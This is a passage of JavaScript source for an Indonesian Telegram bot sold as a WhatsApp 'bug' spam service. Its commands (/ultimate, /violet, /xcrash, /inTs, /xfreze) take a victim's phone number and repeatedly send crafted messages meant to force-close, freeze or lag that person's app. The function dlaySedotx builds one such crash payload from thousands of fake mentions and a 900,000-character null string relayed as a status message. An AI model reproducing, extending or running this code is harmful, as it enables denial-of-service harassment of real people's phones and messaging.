<blockquote><strong>Xhonix Elite 𝚂𝙿𝙰𝙼</strong></blockquote>
↯ Developer : @bluzstur<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
↯ Version : 12.0 Murbug
↯ Prefix : /
↯ Type : Bebas Spam Bug
↯ Fitur : Auto Update
<blockquote><strong>𝙰𝙽𝙳𝚁𝙾𝙸𝙳/𝙸𝙾𝚂 𝙱𝚄𝙶𝚂</strong></blockquote>
↯ /inTs - Forclose And Delay Spam
↯ /xfreze - Freze Invisible Spam
↯ /violet - Delay Hard Spam
<blockquote><strong>𝙸𝙾𝚂 𝙱𝚄𝙶𝚂</strong></blockquote>
↯ /xcrash - Forclose Invisible Ios Spam
<blockquote><strong>𝙳𝙴𝙻𝙰𝚈 𝙷𝙰𝚁𝙳 𝙸𝙽𝚅𝙸𝚂 𝙽𝙾 𝚂𝙿𝙰𝙼</strong></blockquote>
↯ /ultimate - Delay Invisible Super Hard`;

    const keyboard = [
        [
            { text: "BACK", callback_data: "/start", style: "Primary", icon_custom_emoji_id: "5893203503915996356" },
            { text: "CHANNEL", url: "https://t.me/bluzgtgbgt", style: "Success", icon_custom_emoji_id: "5893494861612455015" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action("verify_join", async (ctx) => {
  const joined = await checkJoin(ctx.from.id);

  if (!joined) {
    return ctx.answerCbQuery(
      "❌ Kamu belum join channel",
      { show_alert: true }
    );
  }

  await ctx.answerCbQuery("✅ Verifikasi berhasil");

  try {
    await ctx.deleteMessage();
  } catch {}

  return ctx.reply(
    "✅ Berhasil diverifikasi.\nSilakan ketik /start"
  );
});

bot.command("ultimate", checkWhatsAppConnection, checkPremium, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /ultimate 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/ep2s8m.jpg", {
    caption: `
<blockquote> Succes Details ᝄ</blockquote>  
☇ Target: ${q}
☇ Status: Succes
☇ Command: /ultimate
☇ Type: Super Delay Invisible
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}`, style: "Primary" }]],
    },
  });

  (async () => {
    for (let i = 0; i < 550; i++) {
      console.log(chalk.red(`Send Bug Delay One Hit ${i + 1}/550 To ${q}`));
      await XcoreXQxZ(sock, target);
      await DelayLagiNewBySunn(sock, target);
      await sleep(1500);
    }
  })();
});

bot.command("violet", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
   
   if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  // Ambil nomor
  const number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply("❌ Kasih nomor: /violet 628xxx");
  
  const cleanNum = number.replace(/\D/g, "");
  if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");

  // Proses
  const msg = await ctx.reply(`✅ violet (bug) selesai untuk ${cleanNum}`);
  const target = cleanNum + "@s.whatsapp.net";
  
  for (let i = 0; i < 15; i++) {
    await Delaykali(sock, target);
    await sleep(1500);
    await codexDelay(sock, target);
    await sleep(1500);
    await NoDetectQxZ(sock, target);
    await sleep(1500);
    await CeCkoXQxZ(sock, target);
    await sleep(1500);
    
  }
  
  await msg.editText(`✅ ${cleanNum} selesai.`);
  
 
  await ctx.telegram.sendMessage(
    ownerID,
    `📲 violet dipakai
User: ${ctx.from.first_name}
Target: ${cleanNum}
Grup: ${ctx.chat.title || '-'}
Waktu: ${new Date().toLocaleTimeString()}`
  );
});

bot.command("xcrash", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
   
   if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  // Ambil nomor
  const number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply("❌ Kasih nomor: /xcrash 628xxx");
  
  const cleanNum = number.replace(/\D/g, "");
  if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");

  // Proses
  const msg = await ctx.reply(`✅ xcrash (bug) selesai untuk ${cleanNum}`);
  const target = cleanNum + "@s.whatsapp.net";
  
  for (let i = 0; i < 25; i++) {
    await HollyQxZ(sock, target);
    await sleep(1500);
    
  }
  
  await msg.editText(`✅ ${cleanNum} selesai.`);
  
 
  await ctx.telegram.sendMessage(
    ownerID,
    `📲 xcrash dipakai
User: ${ctx.from.first_name}
Target: ${cleanNum}
Grup: ${ctx.chat.title || '-'}
Waktu: ${new Date().toLocaleTimeString()}`
  );
});

bot.command("inTs", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
   
   if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  // Ambil nomor
  const number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply("❌ Kasih nomor: /inTs 628xxx");
  
  const cleanNum = number.replace(/\D/g, "");
  if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");

  // Proses
  const msg = await ctx.reply(`✅ inTs (bug) selesai untuk ${cleanNum}`);
  const target = cleanNum + "@s.whatsapp.net";
  
  for (let i = 0; i < 10; i++) {
    await MiNoUS(sock, target);
    await sleep(1500);
    await VnXDelayNew(sock, target);
    await sleep(1500);
    await Statusdelay(sock, target);
    await sleep(1500);
    await QxzDelayNew(sock, target);
    await sleep(1500);
    await DElayxInvis(sock, target);
    await sleep(1500);
    
  }
  
  await msg.editText(`✅ ${cleanNum} selesai.`);
  
 
  await ctx.telegram.sendMessage(
    ownerID,
    `📲 inTs dipakai
User: ${ctx.from.first_name}
Target: ${cleanNum}
Grup: ${ctx.chat.title || '-'}
Waktu: ${new Date().toLocaleTimeString()}`
  );
});

bot.command("xfreze", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
   
   if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  // Ambil nomor
  const number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply("❌ Kasih nomor: /xfreze 628xxx");
  
  const cleanNum = number.replace(/\D/g, "");
  if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");

  // Proses
  const msg = await ctx.reply(`✅ xfreze (bug) selesai untuk ${cleanNum}`);
  const target = cleanNum + "@s.whatsapp.net";
  
  for (let i = 0; i < 15; i++) {
    await FreezeXDelayHard(sock, target);
    await sleep(1500);
    await QxzFreeze(sock, target);
    await sleep(1500);
    
  }
  
  await msg.editText(`✅ ${cleanNum} selesai.`);
  
 
  await ctx.telegram.sendMessage(
    ownerID,
    `📲 xfreze dipakai
User: ${ctx.from.first_name}
Target: ${cleanNum}
Grup: ${ctx.chat.title || '-'}
Waktu: ${new Date().toLocaleTimeString()}`
  );
});

// FUNCTION BUG DISINI
async function dlaySedotx(target) {
  for(let i = 0; i < 75; i++) {
    let xwar = {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/594538257_3235516569961849_3349588506547181883_n.enc?ccb=11-4&oh=01_Q5Aa3wGIdnU4a89cz0GLaxdWk1j54W582dW0xZ3czj9Dyyh_Ow&oe=69BB2C5C&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "/wIcGMsYF7liPKItunivQe41vqK7hP4ZNwD8Sqvmexo=",
        fileLength: "39218397",
        seconds: 210,
        mediaKey: "dqqHYls1grodqwvBH61uVJMe2tgGPEgFx3roOQr2PIg=",
        height: 720,
        width: 982,
        fileEncSha256: "xro5p+xptCFGVxUtTrcTGxHnAO0vwU4KCpsw7r0wWMQ=",
        directPath: "/v/t62.7161-24/594538257_3235516569961849_3349588506547181883_n.enc?ccb=11-4&oh=01_Q5Aa3wGIdnU4a89cz0GLaxdWk1j54W582dW0xZ3czj9Dyyh_Ow&oe=69BB2C5C&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1771289203",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADUASAMBIgACEQEDEQH/xAAvAAADAQEBAAAAAAAAAAAAAAAAAwQBAgUBAAMBAQAAAAAAAAAAAAAAAAECAwAE/9oADAMBAAIQAxAAAADXb2zzhkrPyFzwp6wyIOhhvSajkLtWreVB7cQoNh9QzjKhk7pmoIepvEugndjOjrvQVDzBDgfleBOvCwZvOwNV4Al//8QAJBAAAwACAgIBBAMAAAAAAAAAAQIDExIhMQQSEyIyQVEQQmH/2gAIAQEAAT8A+smqc8r+YZT2QV0Ukcpla0dsyP41tk+Zr+pGeL/JLX7KKqFrkp7ZSbSPiaMuN3OmZ/G9JTE2mYfJ9VzyZPIuz3/xjfJPSK+0WzPNOKWifHm0XjrHfqQvoW0UkN8mN8D6FSTZGn2VHrT/AEOIrTfaNI9e2uR9mM1tCnRSfBxW0z4+ez0SE5X5Q1yQIYzJ9lCz5J6Y82RvlmOnUn//xAAdEQACAgIDAQEAAAAAAAAAAAAAAAERAiEQIDFB/9oACAECAQE/AJGLIqj6WPqjIV8y81ev/8QAHBEAAgIDAQEAAAAAAAAAAAAAAAECERAxQQMh/9oACAEDAQE/AItDmj0dnChO2yhxvRL5iOyLSRF9HGLdlJC3hYls/9k=",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          statusSourceType: "VIDEO",
          mentionedJid: Array.from({ length:2000 }, (_, idx) => `628${idx + 72}@s.whatsapp.net`), 
          isForwarded: true, 
          forwardingScore: 7205,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363420757607688@newsletter", 
            newsletterName: "X", 
            serverMessageId: 1000,
            accessibilityText: "X"
          }, 
          statusAttributionType: "RESHARED_FROM_MENTION", 
          contactVcard: true, 
          isSampled: false, 
          dissapearingMode: {
            initiator: target, 
            initiatedByMe: true
          }, 
          expiration: Date.now()
        },
        streamingSidecar: "OAQo4/GQIcY6wldHMzEjSdhQS8NH0bwQEoQgBo9zeqxg8lEVBPJq3uN2O6H16VWvbH5enjDboM/uLBMztwKLlcfaLvG7GyHiBLwNlCgRSa8H8usQHWYUUdfVlqEbt0NjxX2vQNnL5aorK9ZumckTWyD+WGXsWxsCyUuGTN785MDoA7YYuC+RUFyhz6NR0gAcb5l4wrqc0xziH2Okka/7Tg1vI+3ZTl5raKoenrZMXdv7sRXKRtiIUQxs8rHMe0y7F1wq1eEebtGuVSFfTEPvkTBEHzjTgOzslCjiI3cBRIWqnC5ZlWTN6mGZqM3gALKPYfiFOoWAVjaM2lDRgAiyWYRqDvjXL3X5mqIHjmz3dm/thnAw1LSWHgtKSE1vzM9ap4q35TAvf/TcmPLqCkpz7UKdqEmJCSLEvmxEYpLM/9HT5Evx8ZT+S+QNP5OAGN1i0uXOkGKT52QbM0dVKUOhihQkAMzCilxlXf6e7220FDoGGqNGDvXYQrB8D30VGMQb8YdOEtlmo1GsjxtiWKhir1+BJ77uZbVA+4fKaiRVb9gj2JmKcrI7hqsgiQs0vSH1FRuRmNRrSDW4P4/BbRZqW6C5sHkYiOzJeVm/eBtqLh4KYBIE07gGIOeUJC6N3nXdzlYxGILXUN0d7stVsd8FuukCauqVnLQz0qTJcAfffKiIDaj3Nndo1zX1akUZ7DpiTgaiyA3QgXXsKNLPhzJUPk1IWUTbfJ+mTIqRIbSByoDRZLTGx3UA9SccDUvmomskyI05EDZDSrBsUePv2z5yxC6sPO1McerQnU4uPGUaxK88es8TdNmyC5gEwjkbIsu39c/Sb/A40iPQRdvCYrnZ4rbg1AX34ouT8/yZGMXSLl2R/X3uMjlj7mPCTKXXzQCW3m2AvjBpWNP1604SIKrJHjMA+VdZiTZC6NqXWpYumJcWZ7GSfgWmlnwXN8By4t+O+yV2a8Ve7Nt9sqibLt6GHerIqPB0R+G3ycBilk76kC6Cp/HT+LAYKYCTHvpwXtb/Ligki8AMNzoyKqM/w4S6ntrwWCwatK0FdXjh9a187O4O4I53JF0vs1VbCFHXnYRldiUtrh7zEfnQSH4T6Tv6K9ApVoTCClPVQPJ63xlxg8ro9cWq5JXryOT8SECKuHfvJVJVoRH9x/Lhq4IeCU1ykuNilojiYgcylJgCaupix8gZltwybWFmXo2wc4y4cu6JvbUfy+H+VugaXmS019Li+e3oPv4D0QwN+d4FUDU5BPKuFGkByByJPVqbrH3eG55pwDlJJyBPAt7uq/RmpaknMaWmEzoKWF9RGbOTYBzcnZEENn5dP8b7qyEzffvcWhkipd5av1sz6WUnvXU3Or5YPi72RI0P+gv0tERfpaJ1DsCEpuXgIW597uNhopJAIQsq/HVW+eC72Paa5xL6/pxWYADl6JR8lNn0kRJWW0quSV3Qa4dlRqWsJGX1idWdcb0cjG2pFhjOtfC0C/gEP3eqlDjwoIeI5NykF7cRd9+fdCJEAzn8Cb2m9fVoq8VDT6p5991UWIq0HwD3XfCuaLlBiGkUrz2EEwbMpJR0nxfaneznPwQCchss2cDlqS1mO8ksUfNarNdrAnyrybz+mYwPEhydDKpbXfjCTJpun2ta/KGJ2SOSZJfs5W7bpwW/DvStbx8oeWCdhZW4T9Hlttm3lBPnUsiaaNwony2d3CIyMUe1Sv8vfxd/PuBs7ggi9gEMW0wjox2pM9+G/QYdMvO93wPnL92nsdzyx+Ma4q/+24Iv+pIhJlA71wCyGwMn8gfJJzsIcpnl6Tt9yAvly8cdB0yuv42xD6YdIPKugCRo3Bi6fFJoTWKcMfNiQnIogDIb0T4DOZIEHbOoXotUhXimb/9E6quG8uPb+uFo/0bM9RoQ2DVkJfbVnNxHZeP0k/5PQP9qinoh6VyjABfWMij+FRbF/iRe536OjFw86l3qyT7cKjJDhSgXmIUhfvsWRrDx26Z+V/qUEWQ+TtxjYA5530aVFcXoCmTZc0kCnudr8Ap31aHWcEoZHoMeeAOdR+U9Yn11l6q3dqACmxvqFn6EZQ1ctHhPmUL4vBb2sXdXYgqw05IiLetEE7kAWibwcUQbcJUzB23zycUw4T0tolps75Ehrs67FIjTELIrRE4lkeEUM6SRV4YO71z303hTKmEq2mwJEg3QFF+gzrRl80i1Up6ZWGDibXFugpCVdPYnGv2B3FJ9Vxs3zeC7CGhs/9Ps6wmvzKJvffJKe5HlfwNqMuTWHfdVvkvbSVwQCzgQnWDj5WVyRDrp3i81xEOGEv6U2S7FBc1r1+SpM+mbfiAPEQyxXOiCL1EP+YAdc4ZfiMvHisd2QXzlWdXouu0WHmmNnNRtvK0BnyirgCSbTiO1KrsRzLWVDUfsqxxbiMhcmupIyBs1bpYaKfABNSAnXMSfONSX52/SPR3tYoXXxGjFwShFa5+OLjxb/C1PhRrg+1El4dHy/6aOdw4FbCbU/nSmgjqEEn73n1rWt7KwuGRssIm0Hry/vgZfBFdxDp8y+msW1Cp5+9oMYBU/s9kp7ZV4GeH4G5BmMyY4vjWcbPGdVHRU00t9TfxeOggx9v0kThWcTAt1iodd1aLdNKYNaC5GugeOjnwCnIfQ9kUfXXlo7wAAdXDGJ2d66qYb8OZN+Vc3qJaILOzerwugdDT1cl7A1gb8wSCRozDR7BHwuJOTX5iUKPNlYtaExRI0HQXZM4EhW2A9QiKjVs6c+9kD4whIEZsJXAiI/eJdrbLtCfTV8+9ZgelMNmYVQ5oBeJ1WMZSOV79lLf1GMpycuZ7/dPZA1k38ClQKHiNO22B4O763/LfnjzfCZJlPvmz3HYmJ+1TR6rrtMSs1bd69U0mwfyVtrME+SY4sk5tUncRlWcO17XEPRQJm39zwecnOQGv2QcWlO5BJyVVRYm73mXWFJGcOKfM+pG6u3fM1P/RVo5wIkWrarcpqUqHMeyRshYD9KWDdgaGQpZdNkILoavkyAnjAXMU0YnrlxH8rNA/21h2U41FPub6xhvv9dJWqJxp46OCMv6d+sv87FfSqsHIzuNSRYc9UIdvHjS9n/X1bO4YfqZTMHtDHRjuLgR6Ory5grlR89jYQMeLG+eryDLXK0MdXlka1sRa4Q/PtxjcrG3hgwPVCnZmI9LsKxZPOAANchAtWep/5fzMaFg7kiJlRulVt8kP6t6SwKOEnLoyCx3acmVjws0ldhhjNoJrGQ5KG59fhFuNFTKJDzhNNiB2jQ/ZvhQAVCry2SDFCTQRjpeHc6QtmGl6aEnCfPwNP96lF/cDJ7Eho7A0oZDNNG8zQR5BvaybhGqedFpMMX0sNSHXKSuInwKa0Xd/zT4scAra0PTs0vY9JdSaJjST9SCmaWy700stE4+sNjhOBCV/tXwqXjy91EJqU/AnThP0xJATeSXaoO/ux1jOx+RTBxCAd3hf8VWlTNeJyr2ut7XnA6l2itJ6FEnHbdqXPe/tsaWchinQHLd6tCrSqEhJYAZ3rFi6DEoZB7nYM4QMjWe076R7ivwEMfHUvQzm51166SRc6+j7pqw+yAj1MqshY+DEXUPQtfXYf9zVqFtxIUVI0hIF/6m4imJI9qMfETtRbLM+B0Jz+zWpi8FPOa18BihBCAErw0+z4ZYpfVjs/gKWtDBUwmobTMTCEYD0RHrUSsoaUlOktwkjIJjjz894sylvXW+dtA0uxQQCerLRXpedP5Qf5zRVLKcKzcxwjgXs0qFmsg/ZDqgIzp3ghRSOfxAGMz+dcM6xzFWfgxsasix/QAnZamFA7X3SfjSlXoAQ6tJN6f273zH6W33ut3EI6KRTYHJRJVfki4hsL+eWSndJsAMs05S5UP2m360Ulk+3X6bnQVKPT9hKP2lGS4OzsmGGwcpaM1CnaIniZz7rePYwBwy4x+BfMAkGBe/sNoE/qWrc9xsbJj+BjdPNDREzozz6dVBihq9+9XoCj7jcyGUmiEbPQTRwBsQBEcTaz6OmN/lgXGvErSEfMBYHJYALdmykJG5Bfm3cY8lcjjPgLk3gEcunZAZgz8le3xPtmzOy7La+hBUNThEIx+zJ7f2XHC5a1hD09ls0zQLdzBtr2g4A+i9BVt4FMyJDflug/jzRKwX53izyf0WRqyNgUIe03SOGW0chulCgw49TZxBwl7k/XS80Q1WGYP+NOuZ+5ZjF5zq8NdJOB6YIhbuxldpLW1Au+2vz5B8dHLRlALgWdenoFKcXzOPB73mfgBTNx50OwddCErSlEzolIjt8idA/hgA6UjmeXahJV5sCKwFFB5qDjREmFumki+kqBV//f7wtrt8pAIuqviyvAXJ5cPX+9i4Xo8EOuW3Z06dR/vdHSPso8zAwCwR5+EQLw7JN55dfqfy8B4/ThIGKbr4ETVSqpTSYUDZxN4r7tflARvm2L4NmYdHcgCgoNG3RkvwWQC2f+wNkaA5E0BPYBNKNEbtgr+LVtC24LdtyCe1CiajSPEBTsmcGfKZhG8BvkbkDtJTsj6LZfsJlu/fP92tWdFe6nDosW20VTKLF933gQw3od1FvqK9y8JpqUA8fLEC52jwym3c7LKAkrguMGfNjB8uorJte849of0EOkW+my8LMldFJGGprCq4xBK/0FQoa/3O2QjikdrEGaJle0J5akUH2Lmql/Fk57xXIlZumYdL+GpcLShcZDPCJE8xQCJv1t3kH94kV5GbEhi0BbTeLIPk0+JX8W7z7HmT3yH9RKE/8081oC2P6CBnlpO86TaE6HJ59S/HosrdT+P2RwmIxLWcj/M8MOCO3hnvuZfyzd2TbViIqbKQMsvImk3he/vugzIqZyVdgrmQyUJqk/ocqFEaP/Jh/a4qGwIg9zcqxJ549h0TKUOiN0xtUpRL3rjd0/g2aO4yboc9sg5d/IirjUYvBwtzt9a8ZEMa11HE8kYSMBWPtP/Lsj6R1ZHYtVMwUO/ryRN5Msrm/1GwBUTytnxbQ26QV8dR7XTTCeKDthhilZufNVgotsD/CXQ0ODnG3lOMAtHesJ5T3iUmBUZE1H0ZbCeTBOoc9AQEGMnvxIADnfpnoJMhL3uYz4mqMZsffaUOY5pJvpaXajXOt5Di9C6a2qRuvdE45gKNixGJTdg7LgwetdiQIewyC0m4h7LHj0B3ae6Ffb17uynG1UQC4/nOExZVxYRb293RQE0ChR4N2EZ+WnZJIg0k0Oq09xzaiEGcmhF5eh13M4Ur7nyaDvTiZQcjfRfpdP4nIGtOBJjYYpobEkuZiU9+YMwS0Aj/w7xAInX26uAj21V/OMj8165iWbZnLpg/wcEBl/yf1+//EhxcgWkxn4Yq0sS5UIqkw1U3uhKGZ58BZVMb99i16XWvhQ153nyNWKW3PU91Je9jSWuEkVIvkmeOe/WXfM6JGf65XktsqSoMpvHz4YrsxW6TcqrBHR0itAVPBGSjidP5W1koHW+U3UrCRxpDsrygdTcj6j6jbRZKsMRmuo1lpn54JkW9GVSBlNMypb4lN0rNpPoK6WUGP71HIDLj168G4XgulNDmxswV8EluUhgXAm0Lz83m6znKptrVV0ZjthodeThsfAoPX8XDdJ7TQ/QrpjriOZw12xmJUjgbZXtwk3ckcv/Ly94Mxn27ZKmt1cd0kGe1IZs3Wzr7IVQXBNFTsJqP2VW+NfJMzxJA2WY4tqyydHQ7hpNKg8gjQCkBtLs9j1iqJSvApcZQ05bd3wVXbxvieZFZawzuj+F4sqX2jKF5FE1jrwVUmkFwGRqVz8NEUnfF4+QV40C8zZxPgAxN1YjEjNkGXJi0WddBE/RRSSX0KAkHku9ew6rroDzsYnnChmfpNJJvU7W0MHtNaH8YAbWAPFeRYwcRaxFqm52dPxmUHktMZcrTw0+I8gKJeGMSrLMrDe6LyWki+CZd60fYz3bfBNOM8RFlggDQcsQrri32w+s404IZN8ggizSLsIWl9b5ehm8cuw4W7DROFWKFAYtU78gkkUFXGYWqHdXaPTpOCGuY5G5sBttpstnWjmBKpB3HofJ07GxwAcm0OQ6CJogA3O/MTlNTiRYwR59fph2ve38h3IFBZHkKt0vKW0/hZoWtPq7B1AfHUvSwDr3gqPKpNtklIiKrAja01uzqkpisUPoknR6MBaZa81DXV/Q6VlMQurZuywfyNvQPFu9CNqg0kRw0HyS5NV7muraWzakOX/y39qW9U3jaHzPzA4CBeduVDGgLL2XikxoOey96BjcID+XnuVjlGOu0W2J9cgd0V4XYE6JP5rfP80m2FMZKrgd+g7t+T4wDhhEgxGw9aUn4p41s6tKHl33WbrE7rAALFihqpdFi+jbxpZmMCXt/aM/xurDA6ZwP67nGb8PaT5DrSowYnhrPasAlXgpZb4Nq3eZ1a264/hInuz84HVxtMeSktVIs5tUy+ACHhcXmV95Ra0fVq2lYPmwdo+qRCD+kGqBoSNIMoFvefz7+T4biQ4Y7RK0Tq/fRupfFZmWbczbDrTedMNOUPGjdX3awG+WmE7m4TrWQXWtHk/fuFr3MbkWKQRXSD57RWGEUkULLYt3N7yItMnhA3FmomxSkyvmNM0EQt11lA3kfJJrE6V8l1XYKSIyp94rzJmcbYFaIaL1K/0zUPVQHa5eTP+o+Tgl3pmZn2G1Ek4+9qoQ8KjJcPNdRzSAGjwOp6Hg4dtY2JOpQrkqZlhZSWsSeQrFcWf98qQnQNR/WrbpHSexWMFyyyAhRtQBRvfdmB2eXxYTSrnnANWjadspFRFvTRtqYHVxPEkxdxaLfJubmXmyvHV4VV6Na6VcNizjKZ381sKoXm8RXKps/b6Vgzj7r21VvPhZualobUzs0iiOLTdt4qiJ2V7nZPRiBpF2gtfSzwd0McMMy5Bb8xZhzGUztNQIHIamBI2KmujSwLzwh043j++ozHaFosZWec2jjt1nc3meL3D1A0cTM4l34XeqptY9zWQu6yuLWZzp6438TW1CduB2MTxluphPcs542FEWrkT8dOuJK80c6DG9VdHUtGO2fsQOPms2sPanuD/MGslaZqRSQrDrCEwf7X3xeZDYXpkXIWmD2Pp5IxAQODX+AsXR3uEO/DWdN4USRkZX2wMksb+fZSGtetNrdMVyw3hbqpmXEa5bMtQacN7Wu5nDm2O11kIUdq3g5UnE8+Jj62N+8g7guKCBywy9URFuVVnmWk+xK3gt0rndZ51k4pZ2Jq2TZ6xjMx8QtMKX9F1saJri6FWUGfViZETvJkI3wN2So8eaxYAuPvczItITh5ggVODFAXVpPiYnYEmriBZKSQcMlyCmLKPAiXZdf7meQF73W5gPKn/LtuCvoVXMusx02NjQxFZa6IhFzfl/ulDeIym4F0AC+4mvsvy3QEXKb2b3YDDkcQ5925jBwDrsxK/VF1gHjFSh8thEVGDziirPmF5ioeD888YVESqU3M85O+L9Ji2BEy5IHI1kkT7Ioq1vQY8N9921ZlZrshRGdd+ae9+dTffmQMgKCPGUBlb3vCzemaKtzwbcHPivr00q375IxNeaoe5wuMIKMeLud9fOFaZ3TQ1qcvTbO8Slbk7ZatIOufn/pgx+2Ga95xw6cl2tFWFVkRnn6zCqcpeAgTIYOK2ahOMtdfz/bTr6/FcnxJjdACAKj4c6oszzZjRsr+9fQk797QGKZYXnDpnwpEcgh1UWdm9TxajYONpUrV23G9nriMm0KU7s5/1NJonvMjBTDZ9xWh78ghmrn5WSpj24sa17HqLWZcaSXEonnxGsTU61VgyM6SsKebVKKQT8tmksJLTrx/TroliQbxMmKC1pg16PDBeFp/kt9iL8mlh2Kq87YaH5McQS4oqd3gClQ6JqYcWqQMWjyOnGVpT+NsK3tnVC/jw45cTLhFjoMnoduubM2KvuOWJHOe2zQe33eXdHFxG+rsSv6rAsWi7uFbQTcAroU4u0uu82CrYP3M0Mj/1/Z1HZX04weZ6TajPudaXlmbERg="
      },
      interactiveResponseMessage: {
        body: {
          text: "\u0000".repeat(1000),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"X\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    };
    
    let xwar2 = generateWAMessageFromContent(target, xwar, {});

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: xwar2.message
        }
      },
      { messageId: xwar2.key.id, participant: { jid: target } }
    );
  }
  console.log("SUCCES SENDING BUG BULLDOZER DELAY");
}

//


bot.launch()
